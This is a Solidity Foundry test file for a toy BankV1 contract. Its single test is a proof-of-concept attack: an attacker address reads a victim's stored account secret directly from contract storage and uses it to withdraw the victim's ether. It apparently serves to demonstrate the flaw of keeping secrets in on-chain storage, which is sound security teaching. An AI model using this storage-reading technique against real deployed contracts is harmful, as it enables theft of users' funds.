// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {BankV1} from "../src/BankV1.s.sol";

contract BankV1Test is Test {
    BankV1 public bank;

    address mohamed = makeAddr("Mohamed");
    address ahmed = makeAddr("Ahmed");
    address asmaa = makeAddr("Asmaa");
    address attacker = makeAddr("Attacker");

    function setUp() public {
        bank = new BankV1();

        vm.deal(mohamed, 1 ether);
        vm.deal(ahmed, 1 ether);
        vm.deal(asmaa, 0.5 ether);

        vm.startPrank(mohamed);
        bank.createAccount(123456);
        bank.depositEther{value: 1 ether}(mohamed);
        vm.stopPrank();

        vm.startPrank(ahmed);
        bank.createAccount(159951);
        bank.depositEther{value: 1 ether}(ahmed);
        vm.stopPrank();

        vm.startPrank(asmaa);
        bank.createAccount(943167);
        bank.depositEther{value: 0.5 ether}(asmaa);
        vm.stopPrank();
    }

    function test_bankV1_take_ahmed_balance() public {
        console.log("Attacker Balance Before Attack:", attacker.balance);
        assertEq(attacker.balance, 0);

        vm.startPrank(attacker);
        bytes32 slot = keccak256(abi.encode(ahmed, uint256(1)));
        bytes32 value = vm.load(address(bank), slot);

        bank.withdrawEther(ahmed, uint256(value), 1 ether, attacker);
        vm.stopPrank();

        console.log("-----------");
        console.log("Attacker Balance After Attack:", attacker.balance);
        assertEq(attacker.balance, 1 ether);
    }
}
